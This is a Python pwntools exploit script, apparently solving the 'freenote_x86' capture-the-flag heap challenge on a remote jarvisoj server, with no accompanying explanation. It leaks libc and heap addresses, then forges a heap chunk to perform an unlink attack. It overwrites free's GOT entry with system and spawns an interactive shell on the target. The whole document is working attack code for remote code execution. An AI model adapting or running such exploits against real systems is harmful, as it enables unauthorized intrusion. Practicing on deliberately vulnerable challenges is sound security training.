from pwn import *

local = 0

if local:
    sh = process('./freenote_x86')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    offset = 0x1b27b0
else:
    sh = remote('pwn2.jarvisoj.com', 9885)
    libc = ELF('./libc-2.19.so')
    offset = 0x1ad450

elf = ELF('./freenote_x86')

def List(): 
	sh.recvuntil("Your choice: ") 
	sh.sendline("1")

def New(data): 
	sh.recvuntil("Your choice: ") 
	sh.sendline('2') 
	sh.recvuntil("Length of new note: ") 
	sh.sendline(str(len(data))) 
	sh.recvuntil("Enter your note: ") 
	sh.sendline(data) 
	sh.recvuntil("Done.")

def Edit(index,data):
	sh.recvuntil('Your choice: ')
	sh.sendline('3')
	sh.recvuntil('Note number: ')
	sh.sendline(str(index))
	sh.recvuntil('Length of note: ')
	sh.sendline(str(len(data)))
	sh.recvuntil('Enter your note: ')
	sh.sendline(data)
	sh.recvuntil("Done.")

def Delete(index): 
	sh.recvuntil("Your choice: ") 
	sh.sendline("4") 
	sh.recvuntil("Note number: ") 
	sh.sendline(str(index))

# libc address
New('a' * 0x80) # note0
New('b' * 0x80) # note1

Delete(0)

New('AAA')
List()

a = sh.recvuntil('aaaa')
libc_addr = u32(a[-8:-4]) - offset
sys_addr = libc.symbols['system'] + libc_addr

# heap address
New('c' * 0x80) # note2
New('d' * 0x80) # note3

Delete(0)
Delete(2)

New('BBB')
List()

b = sh.recvuntil('aaaa')
chunk2_addr = u32(b[-8:-4])
heap_addr = chunk2_addr - 0xc28 - 0x80 - 0x80
chunk0_addr = heap_addr + 0x18

# unlink
Delete(0)
Delete(1)
Delete(3)
# fake chunk : pre_size - size - fd - bk
payload = p32(0) + p32(0x81) + p32(chunk0_addr - 12) + p32(chunk0_addr - 8)
payload = payload.ljust(0x80, 'C') # chunk0
payload += p32(0x80) + p32(0x80)
payload = payload.ljust(0x80 * 2, 'C') # chunk1

New(payload)
Delete(1)

# hijack got
payload2 = p32(2) + p32(1) + p32(4) + p32(elf.got['free']) + p32(1) + p32(8) + p32(heap_addr + 0xc28 + 0x80)
payload2 = payload2.ljust(0x80 * 2, 'C')

Edit(0, payload2)
Edit(0, p32(sys_addr))
Edit(1, '/bin/sh\x00')

Delete(1)

sh.interactive()
sh.close()